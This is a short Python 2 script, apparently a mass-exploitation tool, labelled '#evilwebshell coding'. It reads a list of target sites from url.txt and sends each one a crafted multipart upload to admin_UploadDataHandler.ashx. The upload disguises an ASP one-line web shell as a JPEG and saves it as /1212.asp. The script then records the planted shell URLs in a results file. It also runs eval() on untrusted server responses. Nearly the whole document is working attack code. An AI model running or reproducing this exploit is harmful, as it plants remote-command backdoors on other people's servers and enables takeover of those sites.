#evilwebshell coding
import urllib2,os,time
jieguo=[]
def saveListToFile(file,list):
    """
        
    :return:
    """
    s = '\n'.join(list)
    with open(file,'a') as output:
        output.write(s)
def exp():
    #buld post body data
    boundary = '----------%s' % (int(time.time() * 1000))
    data = []
    data.append('--%s' % boundary)       
    data.append('Content-Disposition: form-data; name="uploadify";'+' '+'filename="conn1.jpg"\r\n')
    data.append('Content-Type: image/jpeg\r\n')
    data.append('<%execute(request("1"))%>')
    data.append('--%s' % boundary)
        
    data.append('Content-Disposition: form-data; name="saveFile"\r\n')
    data.append('/1212.asp')
    data.append('--%s' % boundary)
    data.append('Content-Disposition: form-data; name="Upload"\r\n')
    data.append('Content-Disposition: form-data; name="Upload"\r\n')
    data.append('Submit Query')
    data.append('--%s' % boundary)
    http_body='\r\n'.join(data)

    #print http_body
    #open url list
    fp=open("url.txt", "r")
    alllines=fp.readlines()
    fp.close()
    for eachline in alllines:
        eachline=eachline.strip('\n')
        eachline=eachline.strip(' ')
        http_url=eachline+'admin_UploadDataHandler.ashx'
        print http_url
        try:
            req=urllib2.Request(http_url, data=http_body)
            req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
            req.add_header('User-Agent','Mozilla/5.0')
            resp = urllib2.urlopen(req, timeout=10)
            qrcont=resp.read()
            a=eval(qrcont)
            a1=eachline+a["src"]
            print a1
            jieguo.append(a1)
    
    
        except Exception,e:
            print 'http error'

def main():
    exp()
    saveListToFile('jieguo.txt',jieguo)


if __name__ == '__main__':
    main()
    
      
      
